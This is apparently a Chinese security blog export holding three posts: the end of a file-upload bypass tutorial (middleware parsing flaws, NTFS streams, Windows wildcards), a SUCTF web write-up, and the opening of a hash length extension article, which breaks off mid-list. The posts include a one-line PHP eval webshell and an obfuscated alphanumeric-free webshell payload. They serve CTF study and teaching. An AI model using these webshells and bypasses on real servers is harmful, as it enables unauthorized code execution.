id="0x02-中间件解析漏洞"><a href="#0x02-中间件解析漏洞" class="headerlink" title="0x02 中间件解析漏洞"></a>0x02 中间件解析漏洞</h2><p>由于中间件本身的缺陷，再对上传文件进行解析时会出现一些不可预料的错误从而导致被利用进行上传绕过。</p><ul><li><p>IIS6.0解析漏洞</p><p>第一种，当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会<code>iis</code>当作<code>asp</code>文件来解析。</p><p>例如:创建<code>xxx.asp</code>目录那么在<code>xxx.asp</code>目录下如果存在<code>1.txt</code>文件会被当做<code>1.asp</code>文件来执行。</p><p>第二种,在IIS6.0下分号后的不被解析。</p><p>例如:<code>xxx.asp;.jpg</code>会被服务器看作为<code>xxx.asp</code>文件</p></li><li><p>IIS7.0/7.5畸形解析漏洞</p><p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php</p></li><li><p>Apache解析漏洞</p><p>在Apache 1.x和Apache 2.x中存在解析漏洞。</p><p>Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。</p><p>如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制</p></li><li><p>Nginx&lt;8.03畸形解析漏洞</p><p>在默认<code>Fast-CGI</code>开启的情况下上传一个<code>xxx.jpg</code>，内容为<code>&lt;?php eval($POST[‘cmd’])?&gt;</code>的文件然后访问<code>xxx.jpg/.php</code>在该目录下就会生成一句话木马文件<code>xxx.php</code>。</p></li><li><p>PHP CGI解析漏洞</p><p>当php的配置文件中的选项cgi.fix_pathinfo= 1开启时，当访问<code>http://www.example.com/xxx.txt/xxx.php</code>时，若xxx.php不存在，则PHP会递归向前解析，将xxx.txt当作php脚本来解析</p></li></ul><h2 id="0x03-利用系统特性"><a href="#0x03-利用系统特性" class="headerlink" title="0x03 利用系统特性"></a>0x03 利用系统特性</h2><h4 id="1-NTFS数据流与文件上传"><a href="#1-NTFS数据流与文件上传" class="headerlink" title="1. NTFS数据流与文件上传"></a>1. NTFS数据流与文件上传</h4><p>NTFS是微软Windows NT 内核系列操作系统支持的，为了解决网络和磁盘配额、文件加密等安全特性所设计的磁盘格式，比FAT文件系统更加稳定，也更加安全。</p><p>NTFS-ADS，又称为NTFS交换数据流，是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都存在多个数据流，也就是说，除了主文件流之外，还可以有许多非主文件流寄宿在主文件流中。</p><p>在文件上传中会用到<code>:</code> 来绕过文件限制，如<code>bypass.php:jpg</code> </p><p>流类型以$开头，默认流类型为data，如上payload的完整形式其实是：</p><p><code>bypass.php:jpg::$DATA</code></p><p>这个格式其实是创建一个与宿主文件关联的数据流文件，之所以会生成<code>bypass.php</code>，是因为它没有找到的自己的宿主文件，所以才创建了一个。而<code>bypass.php::$DATA</code>可以写入文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The default data stream has no name. That is, the fully qualified name for the def ault stream for a file called "sample.txt" is "sample.txt::$DATA" since "sample.t xt" is the name of the file and "$DATA" is the stream type.</span><br></pre></td></tr></table></figure><p>即：<code>sample.txt &lt;--&gt; sample.txt::$DATA</code></p><h4 id="2-windows通配符的妙用"><a href="#2-windows通配符的妙用" class="headerlink" title="2. windows通配符的妙用"></a>2. windows通配符的妙用</h4><ul><li>windows通配符</li></ul><table><thead><tr><th align="center">符号</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">等价于通配符 “?” ,匹配一个0或1个字符</td></tr><tr><td align="center">&lt;</td><td align="center">等价于通配符 “*” ,匹配任意个字符</td></tr><tr><td align="center">“</td><td align="center">等价于通配符 “.” ,匹配除换行符(\n, \r)之外的任意单个字符</td></tr></tbody></table><ul><li><p>通配符+冒号畸形上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//U-Mail demo ... if(isset($_POST['submit']))&#123;</span></span><br><span class="line">$filename = $_POST[<span class="string">'filename'</span>]; </span><br><span class="line">$filename = preg_replace(<span class="string">"/[^\w]/i"</span>, <span class="string">""</span>, $filename);</span><br><span class="line">$upfile = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]; </span><br><span class="line">$upfile = str_replace(<span class="string">';'</span>,<span class="string">""</span>,$upfile); </span><br><span class="line">$upfile = preg_replace(<span class="string">"/[^(\w|\:|\$|\.|\&lt;|\&gt;)]/i"</span>, <span class="string">""</span>, $upfile);</span><br><span class="line">$tempfile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$ext = trim(get_extension($upfile)); </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> strtolower(substr($file, strrpos($file, <span class="string">'.'</span>)+<span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(in_array($ext,<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'php3'</span>,<span class="string">'php5'</span>)))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'Warning ! File type error..'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>($ext == <span class="string">'asp'</span> <span class="keyword">or</span> $ext == <span class="string">'asa'</span> <span class="keyword">or</span> $ext == <span class="string">'cer'</span> <span class="keyword">or</span> $ext == <span class="string">'cdx'</span> <span class="keyword">or</span> $ext ==</span><br><span class="line">  <span class="string">'aspx'</span> <span class="keyword">or</span> $ext == <span class="string">'htaccess'</span>)</span><br><span class="line">          $ext = <span class="string">'file'</span>;</span><br><span class="line">      $savefile = <span class="string">'upload/'</span>.$filename.<span class="string">"."</span>.$ext;</span><br><span class="line">      <span class="keyword">if</span>(move_uploaded_file($tempfile,$savefile))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'Success upload..path :'</span>.$savefile);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'Upload failed..'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"upfile.php"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"filename"</span> <span class="attr">value</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码用普通的办法是无法成功上传php文件的，但是当Windows通配符和NTFS ADS的特相结合时就会产生安全问题。</p><p>绕过方法：</p><ul><li>用<code>bypass.php:jpg</code>来生成一个空文件</li><li>利用<code>bypass.&gt;&gt;&gt;</code>或<code>bypass.&lt;</code>来进行覆盖，写入文件</li></ul></li><li><p>利用通配符获取上传目录</p><p>如果我们上传文件后，无法知道上传文件所在的目录名。在Windows环境下，我们可以利用通配符来猜解出目录名称。</p><p>这里以HITB 2018的一道CTF题目为例，示例代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"./abcdefg1234567aaabb/"</span> . $filename;</span><br><span class="line"></span><br><span class="line">var_dump(getimagesize($file));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网站存在上传功能，我们将一个php木马上传到了某目录下(abcdefg1234567aaabb)，但是不知道其目录名。</p><p>幸运的是，我们可以向1.php的filename参数传入该目录下的一个图片名，程序会返回该图片的尺寸信息。</p><p>执行如下访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../a&lt;/01.png  返回正常</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../aa&lt;/01.png 返回错误</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../ab&lt;/01.png 返回正常</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../abcdefg&lt;/01.png 返回正常</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../abcdefg1234&lt;/01.png 返回正常</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.219.197/1.php?filename=../abcdefg1234567aaabb&lt;/01.png  返回正常</span></span><br></pre></td></tr></table></figure><p>接下来的26 + 10 次尝试中，均返回错误，证明我们已经将目录名猜解完毕，得到目录名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefg1234567aaabb</span><br></pre></td></tr></table></figure><p>假设我们连php木马名也不知道呢?猜解文件名也是同一个道理。</p></li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><p><a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="noopener">Upload Attack Framework</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1078284" target="_blank" rel="noopener">文件上传漏洞的一些总结</a></p></li><li><p><a href="https://xz.aliyun.com/t/2318" target="_blank" rel="noopener">Windows下的”你画我猜” – 告别效率低下的目录扫描方法</a></p></li><li><p><a href="http://www.freebuf.com/vuls/128846.html" target="_blank" rel="noopener">闲话文件上传漏洞</a></p></li><li><p><a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">解决DEDECMS历史难题–找后台目录</a></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>suctf_writeup</title>
      <link href="/writing/suctf-writeup/"/>
      <url>/writing/suctf-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前两天做了两道suctf的web题目，在此记录一下。</p><h3 id="anonymous"><a href="#anonymous" class="headerlink" title="anonymous"></a>anonymous</h3><ul><li><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><ul><li><p>这个题目的考点是匿名函数不匿名，<code>create_function</code>在创建函数的时，其声明的函数是有函数名的，匿名函数会被设置为<code>\x00lambda_%d</code>，这里的%d是顺序递增的。</p><p>这里的%d会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。</p></li></ul></li></ul><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><ul><li><p>题目过滤了大多数可见字符，为了给大家写shell，从第六位开始过滤字符，过滤字符可以Fuzz。</p></li><li><p>可以写入的字符有~ $ _ ; = ( )</p></li><li><p>所以考虑取反符~和不可见字符写shell。</p></li><li><p>参考P总的文章:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p></li><li><p>首先写一个脚本获取我们所需的汉字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset: utf-8'</span>);</span><br><span class="line">$str = <span class="string">"当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块永延帝祚的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不惊。远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。你太单纯了，你还想着这一切会好起来，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够泼墨造一匹快马，追回十年前姑娘。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。大难临头，何以为之？世受国恩，死生系之。"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;mb_strlen($str,<span class="string">'utf-8'</span>);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$st = mb_substr($str,$i,<span class="number">1</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">$a = ~($st);</span><br><span class="line">$b = $a[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ($b == $_GET[<span class="string">'str'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $st;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终得到的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=((_)==(_));<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">$__=~(瞰[$_]);<span class="comment">//assert</span></span><br><span class="line">$__.=~(北[$_]);</span><br><span class="line">$__.=~(北[$_]);</span><br><span class="line">$__.=~(的[$_]);</span><br><span class="line">$__.=~(半[$_]);</span><br><span class="line">$__.=~(拾[$_]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_____=~(说[$_]);<span class="comment">//_POST</span></span><br><span class="line">$____=_.$_____;</span><br><span class="line">$____.=~(小[$_]);</span><br><span class="line">$____.=~(次[$_]);</span><br><span class="line">$____.=~(髪[$_]);</span><br><span class="line"></span><br><span class="line">$_________=$$____;</span><br><span class="line"></span><br><span class="line">$__($_________[$_]);</span><br></pre></td></tr></table></figure></li><li><p>上传之后，在目录中即可找到flag</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度扩展攻击的学习</title>
      <link href="/writing/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/writing/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在做<strong>ISCC2018</strong> 的时候遇到了一题利用的哈希长度扩展攻击的web题目，于是学习了解了一下相关知识，并在此记录一下。</p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);  </span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h2 id="0x02-攻击场景"><a href="#0x02-攻击场景" class="headerlink" title="0x02 攻击场景"></a>0x02 攻击场景</h2><p>哈希长度扩展攻击(Hash Length Extension Attacks)用于攻击MAC(Message Authentication Codes) 计算方式为 <code>$MAC = enc($secret, $message)</code> 的情况. 其中 <code>enc()</code> 为hash函数, <code>$secret</code>为保存在服务器上的秘密信息. 当这里hash函数为 <code>MD4</code> <code>MD5</code> <code>SHA-0</code> <code>SHA-1</code> <code>SHA-256</code> <code>SHA-512</code> 等基于MD结构的算法时. 我们就可以在知道 <code>$secret</code> 长度和一组 <code>$message</code> 、<code>$MAC</code> 的情况下构造出 <code>$message + padding + $yourmessage</code> 的hash从而绕过服务器上的某些验证.</p><h2 id="0x03-Message-Authentication-Codes"><a href="#0x03-Message-Authentication-Codes" class="headerlink" title="0x03 Message Authentication Codes"></a>0x03 Message Authentication Codes</h2><p>在密码学中, 消息认证码(MAC)用于保证消息的完整性(integrity)和真实性(authenticity).</p><p><a href="http://ony7wielg.bkt.clouddn.com/20170511149444648852381.png" target="_blank" rel="noopener"><img src="http://ony7wielg.bkt.clouddn.com/20170511149444648852381.png" alt="img"></a></p><p>(图片来自维基百科)</p><p>上图展示了通过MAC认证消息的过程, 可以看得出MAC是通过MAC算法, 密钥和消息三者生成的, 但通常情况下常用MD5, SHA等hash算法来作MAC算法, 也就是文章开头的<code>$encode()</code>.  Web中常见的情况是服务器充当上图中的两者, 服务器对认证过的请求计算一次MAC传递给用户, 所以在服务器端只要验证用户提交的MAC与计算出的请求的MAC是否相等, 就能判别用户的请求是否合法.  </p><h2 id="0x04-Merkle–Damgard-MD-结构"><a href="#0x04-Merkle–Damgard-MD-结构" class="headerlink" title="0x04 Merkle–Damgård(MD)结构"></a>0x04 Merkle–Damgård(MD)结构</h2><p>在进行哈希长度拓展攻击之前, 我们先要了解一下什么是MD结构.</p><p><a href="http://ony7wielg.bkt.clouddn.com/20170509149430208341796.png" target="_blank" rel="noopener"><img src="http://ony7wielg.bkt.clouddn.com/20170509149430208341796.png" alt="img"></a></p><p>(图片来自维基百科)</p><p>如上图, MD算法简单来说有以下几步:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 首先把要加密的消息按照固定的长度分成若干个块, 对最后一个块进行长度补足</span><br><span class="line">2. 